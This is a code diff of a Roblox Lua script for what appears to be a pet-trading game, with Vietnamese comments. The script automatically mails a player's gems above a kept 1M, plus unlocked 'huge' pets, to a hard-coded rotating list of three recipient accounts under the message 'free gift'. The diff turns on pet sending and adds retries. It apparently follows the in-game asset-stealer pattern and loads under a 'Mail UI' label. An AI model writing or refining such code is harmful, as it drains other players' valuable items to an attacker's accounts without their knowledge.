@@ -94,34 +94,22 @@ local CurrencyCmds = require(ReplicatedStorage.Library.Client.CurrencyCmds)
 local Items = require(ReplicatedStorage.Library.Items)
 
 local function getDiamondsSafe()
-    -- Phương pháp 1: Đọc từ CurrencyCmds
     local ok, amt = pcall(function()
         return CurrencyCmds.Get("Diamonds")
     end)
-    if ok and type(amt) == "number" and amt > 0 then 
-        return amt 
-    end
-    
-    -- Phương pháp 2: Đọc từ Save
-    local ok2, save = pcall(function()
-        return SaveFunction()
-    end)
-    if ok2 and save and save.Inventory and save.Inventory.Currency then
+    if ok and type(amt) == "number" then return amt end
+    local save = SaveFunction and SaveFunction()
+    if save and save.Inventory and save.Inventory.Currency then
         for _, cur in pairs(save.Inventory.Currency) do
             if cur.id == "Diamonds" and type(cur._am) == "number" then
                 return cur._am
             end
         end
     end
-    
-    -- Phương pháp 3: Đọc từ Items.Currency
-    local ok3, entry = pcall(function()
-        return Items.Currency("Diamonds"):FindAny()[1]
-    end)
-    if ok3 and entry and entry._data and type(entry._data._am) == "number" then
+    local entry = Items.Currency("Diamonds"):FindAny()[1]
+    if entry and entry._data and type(entry._data._am) == "number" then
         return entry._data._am
     end
-    
     return 0
 end
 
@@ -153,24 +141,27 @@ end)
 print("[✅] KenPhysical Mail UI loaded (Toggle = H)")
 
 -----------------------------------------------------
--- MAIL SCRIPT (Gửi luân phiên + xử lý lỗi)
+-- MAIL SCRIPT (Gửi luân phiên + Giữ lại gems)
 -----------------------------------------------------
+-- 🔥 DANH SÁCH NGƯỜI NHẬN (Thêm nhiều người vào đây)
 local PlayerToSend = {"JackOmegaQueen", "L3vi_Giga75", "Kaylee_Thunder16"}
-local GemTreshold = 1000000
-local SendOnlyGems = true
+local GemTreshold = 2000000     -- Bắt đầu gửi khi >= 2M gems
+local KeepGems = 1000000        -- Luôn giữ lại 1M gems
+local SendOnlyGems = false
 local MailClaimInterval = 60
 
 local RunService = game:GetService("RunService")
-local LightiningService = game:GetService("Lighting")
+local LightningService = game:GetService("Lighting")
 local LocalPlayer = game.Players.LocalPlayer
 local NetworkPath = ReplicatedStorage.Network
 local NetworkSource = require(ReplicatedStorage.Library.Client.Network)
 local AlreadySend = {}
 
--- Tracking người nhận
+-- 🔥 HỆ THỐNG LUÂN PHIÊN NGƯỜI NHẬN
 local currentRecipientIndex = 1
 local recipientFailCount = {}
 
+-- Khởi tạo fail counter
 for _, name in ipairs(PlayerToSend) do
     recipientFailCount[name] = 0
 end
@@ -181,10 +172,12 @@ local function getNextRecipient()
     while attempts < #PlayerToSend do
         local recipient = PlayerToSend[currentRecipientIndex]
         
+        -- Nếu người này fail dưới 3 lần, dùng người này
         if recipientFailCount[recipient] < 3 then
             return recipient, currentRecipientIndex
         end
         
+        -- Chuyển sang người tiếp theo
         currentRecipientIndex = currentRecipientIndex % #PlayerToSend + 1
         attempts = attempts + 1
     end
@@ -256,15 +249,23 @@ local function genMessage()
 	return "free gift " .. tostring(math.random(1,100))
 end
 
+-- 🔥 HÀM GỬI MAIL VỚI XỬ LÝ LỖI VÀ LUÂN PHIÊN
 local function SendMail(category, id, amount)
     local maxRetries = #PlayerToSend
     local attempts = 0
     
+    print("\n🚀 BẮT ĐẦU GỬI MAIL")
+    print("📦 Category:", category)
+    print("💯 Amount:", amount)
+    
     while attempts < maxRetries do
         local recipient, index = getNextRecipient()
         
+        print("\n👤 Thử gửi cho:", recipient, "(lần", attempts + 1, "/", maxRetries, ")")
+        print("📊 Fail count:", recipientFailCount[recipient])
+        
         local success, msg = NetworkPath["Mailbox: Send"]:InvokeServer(
-            {recipient}, 
+            recipient,  -- Gửi cho 1 người
             genMessage(), 
             category, 
             id, 
@@ -272,17 +273,20 @@ local function SendMail(category, id, amount)
         )
         
         if success then
-            print("✅ Đã gửi mail cho:", recipient)
+            print("✅ GỬI THÀNH CÔNG CHO:", recipient)
             recipientFailCount[recipient] = 0
             currentRecipientIndex = currentRecipientIndex % #PlayerToSend + 1
             return success, msg
         else
-            warn("❌ Lỗi gửi cho", recipient, ":", msg)
+            warn("❌ GỬI THẤT BẠI CHO:", recipient)
+            warn("   Lý do:", msg or "Unknown")
             recipientFailCount[recipient] = recipientFailCount[recipient] + 1
             currentRecipientIndex = currentRecipientIndex % #PlayerToSend + 1
             attempts = attempts + 1
             
+            -- Nếu mailbox đầy, thử người khác ngay
             if msg and (msg:find("space") or msg:find("full")) then
+                warn("   → Mailbox đầy, chuyển người khác...")
                 task.wait(0.3)
                 continue
             end
@@ -291,7 +295,7 @@ local function SendMail(category, id, amount)
         end
     end
     
-    warn("⚠️ Đã thử gửi cho tất cả", maxRetries, "người nhưng đều thất bại!")
+    warn("⚠️ ĐÃ THỬ GỬI CHO TẤT CẢ", maxRetries, "NGƯỜI NHƯNG ĐỀU THẤT BẠI!")
     return false, "All recipients failed"
 end
 
@@ -301,24 +305,67 @@ local function CheckInventory()
 	local GemsId = Gems._uid
 	local GemsAmount = getDiamondsSafe()
 	local MailCost = mailcost()
+	
+	local availableToSend = GemsAmount - KeepGems - MailCost
+	
+	print("\n💎 Gems hiện có:", GemsAmount)
+	print("🔒 Giữ lại:", KeepGems)
+	print("💰 Mail Cost:", MailCost)
+	print("📤 Có thể gửi:", availableToSend)
 
-	if GemsAmount >= GemTreshold then
-		local sus, ms = SendMail("Currency", GemsId, GemsAmount - MailCost - 20000)
-		if not sus and ms and ms == "Couldn't remove this item from your inventory!" then
-			task.wait(.25)
-			SendMail("Currency", GemsId, GemsAmount - 5000000)
+	-- GỬI GEMS
+	if GemsAmount >= GemTreshold and availableToSend > 0 then
+		print("📬 Đang gửi", availableToSend, "gems...")
+		local sus, ms = SendMail("Currency", GemsId, availableToSend)
+		
+		if not sus then
+			warn("❌ Lỗi gửi gems:", ms)
+			if ms and ms == "Couldn't remove this item from your inventory!" then
+				task.wait(.25)
+				local retryAmount = math.max(0, availableToSend - 1000000)
+				if retryAmount > 0 then
+					print("🔄 Thử lại với", retryAmount, "gems...")
+					SendMail("Currency", GemsId, retryAmount)
+				end
+			end
 		end
+	else
+		print("⏸️ Không gửi gems (chưa đủ threshold hoặc gems)")
 	end
 
-	if GemsAmount - MailCost < 0 then return end
-	if Data and Data.Inventory and not SendOnlyGems then
+	-- GỬI PETS
+	if not SendOnlyGems and Data and Data.Inventory then
+		print("\n🐾 Kiểm tra pets...")
+		local petCount = 0
+		
 		for i,v in pairs(Data.Inventory.Pet or {}) do
 			if string.find(v.id:lower(), "huge") and not AlreadySend[i] then
-				if v._lk then NetworkPath["Locking_SetLocked"]:InvokeServer(i, false) task.wait(.25) end
+				petCount = petCount + 1
+				
+				if v._lk then 
+					NetworkPath["Locking_SetLocked"]:InvokeServer(i, false) 
+					task.wait(.25) 
+				end
+				
+				print("📦 Đang gửi pet:", v.id)
 				local susses, ms = SendMail("Pet", i, 1)
-				if susses then AlreadySend[i]=true task.wait(.25) end
-				if ms and ms=="They don't have enough space!" then break end
+				
+				if susses then 
+					print("✅ Đã gửi pet:", v.id)
+					AlreadySend[i] = true 
+					task.wait(.25) 
+				else
+					warn("❌ Lỗi gửi pet:", ms)
+					if ms and ms == "They don't have enough space!" then 
+						warn("⚠️ Tất cả người nhận đều hết chỗ!")
+						break 
+					end
+				end
 			end
+		end
+		
+		if petCount == 0 then
+			print("📭 Không có huge pet để gửi")
 		end
 	end
 end
